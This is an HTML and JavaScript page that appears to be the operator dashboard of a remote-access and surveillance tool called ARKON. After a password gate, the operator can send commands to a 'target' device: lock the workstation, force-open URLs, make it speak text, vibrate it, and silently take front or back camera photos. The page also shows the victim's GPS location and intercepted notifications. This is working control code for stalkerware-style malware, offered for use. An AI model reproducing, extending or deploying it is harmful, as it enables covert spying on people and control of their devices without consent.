<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARKON - RULER</title>
    <style>
        :root {
            --neon: #00ff41;
            --danger: #ff0055;
            --bg: #0d0d0d;
        }

        body {
            background-color: var(--bg);
            color: var(--neon);
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
            margin: 0;
            user-select: none;
        }

        h1 {
            border-bottom: 2px solid var(--neon);
            padding-bottom: 10px;
            letter-spacing: 5px;
        }

        .status {
            margin-bottom: 30px;
            font-size: 1.2rem;
        }

        .grid {
            display: grid;
            gap: 15px;
            grid-template-columns: 1fr 1fr;
        }

        button {
            background: transparent;
            border: 2px solid var(--neon);
            color: var(--neon);
            padding: 20px;
            font-family: inherit;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.1s;
        }

        button:active {
            background: var(--neon);
            color: var(--bg);
            transform: scale(0.98);
        }

        button.danger {
            border-color: var(--danger);
            color: var(--danger);
        }

        button.danger:active {
            background: var(--danger);
            color: white;
        }

        input {
            width: 100%;
            box-sizing: border-box;
            background: #000;
            border: 1px solid #333;
            color: white;
            padding: 10px;
            margin-top: 10px;
            font-family: inherit;
            display: none;
        }

        #terminal {
            margin-top: 30px;
            opacity: 0.7;
            font-size: 0.8rem;
            text-align: left;
            height: 100px;
            overflow-y: auto;
            border-top: 1px solid #333;
            padding-top: 10px;
        }

        /* Login Overlay */
        #login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--bg);
            z-index: 1000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #login-overlay input {
            display: block;
            width: 80%;
            margin-bottom: 20px;
            text-align: center;
            font-size: 1.2rem;
            border: 2px solid var(--neon);
        }

        #login-overlay button {
            width: 80%;
        }
    </style>
</head>

<body>

    <!-- Security Gate -->
    <div id="login-overlay">
        <h1>ACCESS DENIED</h1>
        <p>AUTHENTICATION REQUIRED</p>
        <input type="password" id="password" placeholder="ENTER ACCESS CODE">
        <button onclick="login()">UNLOCK SYSTEM</button>
    </div>

    <h1>ARKON</h1>
    <div class="status" id="status">[WAITING FOR TARGET...]</div>

    <div class="grid">
        <button onclick="cmd('LOCK')" class="danger">LOCK WORKSTATION</button>
        <button onclick="cmd('MINIMIZE')">MINIMIZE ALL</button>

        <button onclick="toggleInput('speak')">VOICE OF GOD</button>
        <button onclick="toggleInput('open')">FORCE OPEN</button>
        <button onclick="cmd('VIBRATE')">VIBRATE TARGET</button>
        <button onclick="snap('front')">SNAP FRONT</button>
        <button onclick="snap('back')">SNAP BACK</button>
    </div>

    <input type="text" id="speak_input" placeholder="Enter text to speak..." onchange="sendInput('SPEAK', this.value)">
    <input type="text" id="open_input" placeholder="Enter URL..." onchange="sendInput('OPEN', this.value)">

    <div id="camera-preview"
        style="margin: 20px auto; border: 2px solid var(--neon); padding: 5px; display: none; max-width: 500px;">
        <div style="font-size: 0.7rem; margin-bottom: 5px;">[LAST CAMERA SHOT]</div>
        <img id="shot-img" src="" style="width: 100%; border: 1px solid var(--neon);">
    </div>

    <div id="location-box" style="margin: 20px 0; border: 1px dashed var(--neon); padding: 10px;">
        <a id="maps-link" href="#" target="_blank" style="color: var(--neon); text-decoration: none;">[NO GPS DATA]</a>
    </div>

    <div id="notifications"
        style="border: 1px solid #333; padding: 10px; height: 150px; overflow-y: scroll; text-align: left; margin-bottom: 20px;">
        <div style="border-bottom: 1px solid #333; color: #666; font-size: 0.8rem;">[NOTIFICATION INTERCEPT STREAM]
        </div>
    </div>

    <div id="camera-preview" style="margin-top: 20px; border: 2px solid var(--neon); padding: 5px; display: none;">
        <div style="font-size: 0.7rem; margin-bottom: 5px;">[LAST CAMERA SHOT]</div>
        <img id="shot-img" src="" style="width: 100%; max-width: 400px; border: 1px solid var(--neon);">
    </div>

    <div id="terminal"></div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const term = document.getElementById('terminal');
        const statusEl = document.getElementById('status');
        const overlay = document.getElementById('login-overlay');
        const passInput = document.getElementById('password');

        // Login Logic
        function login() {
            const pass = passInput.value;
            socket.emit('login', pass);
        }

        socket.on('login_success', () => {
            overlay.style.display = 'none';
            log('ACCESS GRANTED');
            // Identify as Mobile Controller AFTER auth
            socket.emit('identify', 'mobile');
        });

        socket.on('login_fail', () => {
            alert('ACCESS DENIED');
            passInput.value = '';
        });

        socket.on('status', (state) => {
            statusEl.innerText = state === 'ONLINE' ? '[TARGET ACQUIRED]' : '[TARGET LOST]';
            statusEl.style.color = state === 'ONLINE' ? '#00ff41' : '#ff0055';
            log(`System status: ${state}`);
        });

        socket.on('gps', (data) => {
            const link = document.getElementById('maps-link');
            link.href = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
            link.innerText = `[LOC] ${data.lat}, ${data.lon}`;
            log(`GPS UPDATE: ${data.lat}, ${data.lon}`);
        });

        socket.on('notification', (data) => {
            const container = document.getElementById('notifications');
            const entry = document.createElement('div');
            entry.style.borderBottom = '1px solid #333';
            entry.style.padding = '5px 0';
            entry.innerText = `[${data.app}] ${data.title}: ${data.text}`;
            container.appendChild(entry);
            container.scrollTop = container.scrollHeight;
        });

        socket.on('camera_shot', (data) => {
            const preview = document.getElementById('camera-preview');
            const img = document.getElementById('shot-img');
            img.src = `data:image/jpeg;base64,${data.image}`;
            preview.style.display = 'block';
            log(`CAMERA SHOT RECEIVED (${data.camera})`);
        });

        function cmd(action) {
            if (navigator.vibrate) navigator.vibrate(50);
            socket.emit('command', { action });
            log(`Sent command: ${action}`);
        }

        function snap(camera) {
            socket.emit('command', { action: 'TAKE_PHOTO', camera });
            log(`Sent command: TAKE_PHOTO (${camera})`);
        }

        function sendInput(action, value) {
            socket.emit('command', { action, value });
            log(`Sent payload: ${action} -> ${value}`);
            document.getElementById('speak_input').style.display = 'none';
            document.getElementById('open_input').style.display = 'none';
        }

        function toggleInput(type) {
            const el = document.getElementById(`${type}_input`);
            el.style.display = el.style.display === 'block' ? 'none' : 'block';
            el.focus();
        }

        function log(msg) {
            term.innerHTML += `> ${msg}<br>`;
            term.scrollTop = term.scrollHeight;
        }
    </script>
</body>

</html>
